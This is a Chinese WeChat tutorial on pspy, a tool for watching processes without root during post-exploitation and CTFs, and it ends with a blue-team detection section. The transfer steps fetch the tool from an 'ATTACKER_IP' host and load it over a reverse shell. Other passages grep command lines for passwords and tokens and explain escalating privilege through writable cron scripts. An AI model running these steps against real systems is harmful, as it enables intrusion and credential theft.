---
title: 【微信】【工具学习26】pspy：让你无root也能看透系统里谁在干什么
source: https://mp.weixin.qq.com/s/-y45w0WOFpXez04bVCwE7Q
source_host: mp.weixin.qq.com
clip_date: 2026-09-21T10:17:08+08:00
trace_id: 2af8a9d3-7e3c-41d6-9ae8-0fe871c82b55
content_hash: 824fb92c66152028814c7b535327d84a771d6e3e3da6fcf577f04cf8128452a3
status: synced
tags:
  - 微信
  - 安全工具
  - Linux安全
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: pspy 是不需要 root 的 Go 单二进制工具，靠轮询 /proc 加 inotify 监听，实时盯住系统进程与文件变动，成为 CTF 与后渗透阶段找提权线索的标配。
ai_summary_style: key-points
images_status:
  total: 3
  succeeded: 3
  failed_urls: []
notion_page_id: 3e275244-d011-81e3-9c11-f7fee277c249
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> pspy 是不需要 root 的 Go 单二进制工具，靠轮询 /proc 加 inotify 监听，实时盯住系统进程与文件变动，成为 CTF 与后渗透阶段找提权线索的标配。
> 
> - **核心原理：** 普通用户可只读大部分 `/proc/[0-9]+/`，pspy 每 100ms 扫描一次 cmdline/status/stat 提取 PID、PPID、UID 与完整命令行，能捕获 `ps` 抓不到的短命进程；同时在 `/usr`、`/tmp`、`/etc`、`/home`、`/var`、`/opt` 注册 inotify，文件事件触发即反查进程。全程不用 ptrace 和 CAP_SYS_PTRACE。
> - **版本选择：** 提供 pspy32/pspy64（约 2.5–3 MB，带 inotify）与 pspy32s/pspy64s（约 1–1.2 MB，stripped 无 inotify）四个预编译版本；只需看进程用精简版，需监控文件变动用完整版。
> - **落地与参数：** 传输可用 wget/curl、base64 粘贴或反弹 shell；`/tmp` 若挂 `noexec` 可改 `/dev/shm`。常用组合 `./pspy64 -pf -c -i 200 -r /home -r /tmp`，`-p` 进程、`-f` 文件事件、`-i` 扫描间隔（默认 1000ms）、`-c` 彩色、`-r` 递归目录；间隔建议 200–1000ms，过小会加剧 I/O 且易暴露。
> - **典型场景：** 发现隐藏 cron 任务并检查脚本可写性提权、捕获命令行明文密码（如 `mysql -u root -p...`）、观察管理员行为、`-f` 监控 Web 部署文件变动、CTF 中配合 SUID 与可写路径线索构造提权链。
> - **对比与检测：** 与 linpeas 互补——后者做静态配置检查，pspy 做动态行为监控；蓝队可从进程名、/proc 高频遍历的 auditd/eBPF 监控、二进制哈希、`fs.inotify.max_user_watches=0` 等角度发现它。

**逆熵寻生** *2026年9月21日 09:55*

拿到shell后两眼一抹黑？pspy让你无root也能看透系统里谁在干什么

渗透测试中有一个场景：好不容易拿到一个低权限 shell，却不知道这台机器上到底在跑什么。crontab 看不了，其他用户的进程看不到，管理员什么时候执行了什么命令更是一无所知。

pspy 就是为这个场景而生的。它是 Go 写的一个单二进制工具，不需要 root 权限，不需要任何特殊 capability，丢上去就能跑，实时监控整个系统的进程和文件变动。GitHub 上 14k+ star，几乎是 CTF 和后渗透阶段的标配。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e0f4cf80dbcd6b43.jpg)

## 原理：无特权读取 /proc

原理：读 /proc 不需要特权

pspy 的核心思路其实很朴素——Linux 的 `/proc` 文件系统对普通用户开放了大部分进程的只读信息。pspy 做了两件事：

第一，周期性扫描 `/proc/[0-9]+/` ，从 `cmdline` 、 `status` 、 `stat` 里提取 PID、PPID、UID 和完整命令行。它不是像 `ps aux` 那样拍一张快照就结束，而是持续轮询，每 100ms 扫一次。那些跑完就消失的短命进程——比如 cron 触发的脚本——用 `ps` 根本抓不到，pspy 不会漏。

第二，在关键目录上注册 inotify 监听，实时捕获文件创建、修改、删除事件。默认监控 `/usr` 、 `/tmp` 、 `/etc` 、 `/home` 、 `/var` 、 `/opt` 。当文件系统事件触发时，pspy 会立即扫描 `/proc` 获取对应的进程信息。

两个机制配合，既不会漏掉一闪而过的进程，也能看到谁在什么时候动了什么文件。而且全程不需要 `ptrace` 、不需要 CAPSYSPTRACE，任何普通用户都能跑。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/48e48b9172ec04c7.jpg)

## 四个预编译版本选择

四个二进制，按需选择

pspy 提供四个预编译版本：

| 二进制 | 架构  | 大小  | inotify 支持 |
| --- | --- | --- | --- |
| pspy32 | x86 | ~2.5 MB | 有   |
| pspy64 | x86_64 | ~3 MB | 有   |
| pspy32s | x86 | ~1 MB | 无（精简版） |
| pspy64s | x86_64 | ~1.2 MB | 无（精简版） |

带 `s` 后缀的是 stripped 版本，去掉了 inotify 支持，体积缩小一半以上。如果目标机器磁盘空间紧张或者传输带宽有限，用精简版就够了。需要监控文件变动（比如观察管理员往 `/tmp` 写了什么），就用完整版。

传输到目标机器

实战中拿到 shell 后，传工具是个技术活。几种常用方式：

\# 方式一：目标有 wget/curl  
\# 攻击机开 HTTP 服务  
python3 -m http.server 8080  
\# 目标机器下载  
wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64  
chmod +x /tmp/pspy64  
  
\# 方式二：目标没有 wget/curl，用 base64 传  
\# 攻击机编码  
base64 -w0 pspy64 > pspy64.b64  
\# 目标机器解码（直接粘贴或通过 shell 写入）  
base64 -d pspy64.b64 > /tmp/pspy64 &&chmod +x /tmp/pspy64  
  
\# 方式三：通过已有的反弹 shell 传输  
\# 在攻击机执行  
cat pspy64 | base64 | xclip -sel clip  
\# 在反弹 shell 里粘贴解码  
echo '<base64内容>' | base64 -d > /tmp/pspy64 &&chmod +x /tmp/pspy64

注意 `/tmp` 是最常见的落地点，但有些环境挂载了 `noexec` 。如果遇到权限问题，可以试 `/dev/shm` （内存文件系统，通常可执行）或者当前用户的 home 目录。

核心用法

最基本的使用，什么都不用加：

./pspy64

启动后屏幕上会实时刷出进程信息，格式清晰：

2026/08/3114:08:16 CMD: UID=0 PID=608 | /usr/sbin/sshd -D \[listener\] 0 of 10-100 startups  
2026/08/3114:08:16 CMD: UID=0 PID=462 | /usr/sbin/cron -f  
2026/08/3114:09:01 CMD: UID=0 PID=1247 | /bin/sh-c /opt/scripts/backup.sh  
2026/08/3114:09:01 CMD: UID=0 PID=1248 | /usr/bin/python3 /opt/scripts/backup.sh --full

关键看 `UID=0` 的行——这些是 root 跑的进程。上面这个例子中，root 在每分钟执行一个备份脚本，这就是一个潜在的提权突破口：如果这个脚本里引用了你能写的文件，或者脚本的参数可以被劫持，提权就到手了。

常用参数组合

## 常用参数组合

\# 同时监控进程和文件系统事件，每 500ms 扫描一次  
./pspy64 -pf -i 500  
  
\# 只关注特定目录的文件变动  
./pspy64 -f -r /home/admin -r /var/www  
  
\# 用颜色区分不同用户的进程（方便肉眼识别 root 进程）  
./pspy64 -c  
  
\# 完整实战配置：进程+文件系统+颜色+自定义扫描间隔  
./pspy64 -pf -c -i200 -r /home -r /tmp -r /opt

参数说明：

🔹 `-p` ：打印进程事件（默认开启）

🔹 `-f` ：打印文件系统事件（默认关闭）

🔹 `-i` ：procfs 扫描间隔，单位毫秒，默认 1000

🔹 `-r` ：递归监控目录（可多次指定）

🔹 `-d` ：非递归监控目录

🔹 `-c` ：彩色输出

输出过滤技巧

pspy 的输出量可能很大，实战中建议配合过滤使用：

\# 只看 root 进程  
./pspy64 | grep "UID=0"  
  
\# 只看 cron 相关  
./pspy64 | grep -i cron  
  
\# 只看包含密码/密钥参数的进程（凭据泄露检测）  
./pspy64 | grep -iE "password|passwd|secret|key|token|api"  
  
\# 输出到文件慢慢分析  
./pspy64 -pf > /tmp/pspy_output.log 2>&1 &

## 五个实战场景

五个实战场景

场景一：发现隐藏的 cron 任务

这是 pspy 最经典的用法。拿到 shell 后， `crontab -l` 看不到什么， `/etc/crontab` 也没有异常。但跑起 pspy 等几分钟，经常能发现 root 在定时执行某些脚本。

2026/08/3115:00:01 CMD: UID=0 PID=3421 | /bin/sh-c /usr/local/bin/cleanup.sh  
2026/08/3115:00:01 CMD: UID=0 PID=3422 | /bin/bash /usr/local/bin/cleanup.sh

接下来要做的就是：检查 `cleanup.sh` 的内容和权限。如果脚本里调用了你当前用户可写的某个文件，或者脚本本身有可写的父目录，就可以通过篡改脚本内容来提权。

场景二：捕获命令行中的明文密码

很多管理员习惯不好，会在命令行里直接传密码：

2026/08/3116:23:45 CMD: UID=0 PID=5678 | mysql -u root -pSuperSecret123  
2026/08/3116:24:12 CMD: UID=1000 PID=5690 | curl-u admin:P@ssw0rd! https://api.internal/  
2026/08/3116:25:33 CMD: UID=0 PID=5712 | /usr/bin/rsync -avz-e"ssh -P MyKey123" /data/ backup@10.0.0.5:/backup/

这些信息通过 `ps aux` 只能看到执行瞬间的快照，用 pspy 持续监控则不会错过。

场景三：监控管理员行为

在多用户系统或跳板机上，管理员经常登录执行操作。pspy 可以实时看到他们做了什么：

2026/08/3117:00:05 CMD: UID=0 PID=6001 | sudo su -  
2026/08/3117:00:12 CMD: UID=0 PID=6015 | cat /etc/shadow  
2026/08/3117:01:30 CMD: UID=0 PID=6023 | vim /etc/passwd  
2026/08/3117:02:45 CMD: UID=0 PID=6040 | scp /root/backup.tar.gz admin@external:/tmp/

这不仅能帮你在渗透测试中找到提权路径，在安全审计场景中也能发现管理员的不当操作。

场景四：文件系统监控发现部署行为

开启 `-f` 参数后，pspy 会报告文件变动事件：

2026/08/3118:00:01 FS CREATE /var/www/html/config.php.new  
2026/08/3118:00:03 FS CLOSE_WRITE /var/www/html/config.php.new  
2026/08/3118:00:03 FS DELETE /var/www/html/config.php  
2026/08/3118:00:03 FS CREATE /var/www/html/config.php  
2026/08/3118:00:15 CMD: UID=0 PID=7001 | /bin/systemctl restart nginx

上面这组事件说明有人在更新 Web 配置并重启服务。如果这个过程中有你可以利用的时间窗口（比如新旧配置切换的瞬间），就可以做一些中间人操作。

场景五：CTF 中的标准流程

在 CTF 比赛中，pspy 几乎是标准流程的一环。典型套路：

1\. 拿到低权限 shell

2\. 上传 pspy，运行 `./pspy64 -pf -i 200`

3\. 等待 root 进程出现，重点关注：

🔹 可写路径下的脚本执行

🔹 SUID 程序调用

🔹 包含凭据的命令行

🔹 定期任务触发的可写文件操作

1\. 根据发现的线索构造提权路径

参数调优经验值

不同场景下的推荐配置：

| 场景  | 推荐参数 | 说明  |
| --- | --- | --- |
| 快速侦察 | `./pspy64` | 默认配置，先看个大概 |
| 抓 cron 任务 | `./pspy64 -i 500` | 缩短扫描间隔，避免漏掉短命进程 |
| 全面监控 | `./pspy64 -pf -i 200` | 进程+文件系统，50ms 级别扫描 |
| 低资源目标 | `./pspy64s -i 2000` | 精简版+放宽间隔，减少性能影响 |
| 定向监控 | `./pspy64 -f -r /home/user` | 只盯一个目录 |

扫描间隔不是越小越好。 `-i 100` 在负载较高的系统上会产生大量 I/O，可能影响目标性能，也更容易被发现。一般 200-1000ms 是合理范围。

同类工具对比

| 特性  | pspy | 传统 ps/top | linpeas |
| --- | --- | --- | --- |
| 需要 root | 否   | 否（但看不到其他用户） | 否   |
| 持续监控 | 是   | 否（一次性快照） | 否（静态检查） |
| 捕获短命进程 | 是   | 否   | 否   |
| 文件系统监控 | 是   | 否   | 否   |
| 单二进制 | 是（1-3MB） | 系统自带 | 否（shell 脚本） |
| 依赖  | 无   | 无   | bash + 常用工具 |
| 适合场景 | 后渗透/CTF | 系统管理 | 提权枚举 |

pspy 和 linpeas 不是替代关系，而是互补。linpeas 做的是静态配置检查（SUID、capabilities、可写目录等），pspy 做的是动态行为监控。实战中两个都跑起来效果最好。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/88f1e520e7fa7f07.jpg)

蓝队检测视角

## 蓝队检测视角

pspy 本身非常隐蔽——它只读 `/proc` 和注册 inotify，不创建网络连接，不写特殊文件，不加载内核模块。但仍然有办法发现它：

🔹 **进程列表**：pspy 自身的进程会出现在 `ps` 输出中，名称是 `pspy64` 或 `pspy32`

🔹 **/proc 扫描检测**：频繁的 `/proc` 遍历会产生一定的 I/O，可以通过 `auditd` 或 eBPF 工具监控

🔹 **文件哈希**：检查已知 pspy 二进制的哈希值

🔹 **inotify 限制**：可以通过 `sysctl fs.inotify.max_user_watches=0` 禁用非特权用户的 inotify（但这会影响正常应用）

实际防御中，更有效的做法是：不在命令行传密码、确保 cron 脚本不可被低权限用户修改、定期检查系统上的未知二进制文件。

小结

pspy 的哲学就是 Unix 的"做好一件事"——无特权进程监控，它做到了极致。不需要 root，不需要配置，丢上去就跑。1MB 的精简版就能覆盖最核心的需求，在 CTF 和后渗透场景中几乎是不可或缺的工具。

拿到 shell 后的第一件事，不是急着提权，而是先用 pspy 看清楚这台机器上到底在发生什么。信息就是力量。

关注我，持续不断地成长！

往期推荐：

****[【工具学习13】Impacket 工具实战教程（一）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习14】Impacket 工具实战教程（二）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习15】Impacket 工具实战教程（三）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习16】Impacket 工具实战教程（四）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习17】Impacket 工具实战教程（五）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习18】Impacket 工具实战教程（六）](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习19】httpx 迅速定位真正存活的 HTTP 服务](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习20】NetExec 内网渗透实战教程](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习21】Subfinder ：12000 Star 的被动子域名侦察利器](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247484245&idx=1&sn=f0cf70323a20357dd6ea9bda0eb73446&scene=21#wechat_redirect)****

****[【工具学习22】RustScan ：3秒扫完65535端口](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247485382&idx=1&sn=e81bb59f905102f0fac7a82701606c67&scene=21#wechat_redirect)****

****[【工具学习23】BloodHound：一条路径从普通域用户到Domain Admin](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247485476&idx=1&sn=76eae3dda26f88b39defdea00ec97b94&scene=21#wechat_redirect)****

****[【工具学习24】BloodHound进阶（二）：Cypher查询与三条深度攻击路径](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247485558&idx=1&sn=e73a6a9f43b949e9c3a45c65c4503b03&scene=21#wechat_redirect)****

****[【工具学习25】ligolo-ng：让内网像直连一样打](https://mp.weixin.qq.com/s?__biz=MzY4NzI2NTczOQ==&mid=2247485601&idx=1&sn=8006686e041c10b1b62df67c328f931c&scene=21#wechat_redirect)****

渗透测试工具推荐 · 目录
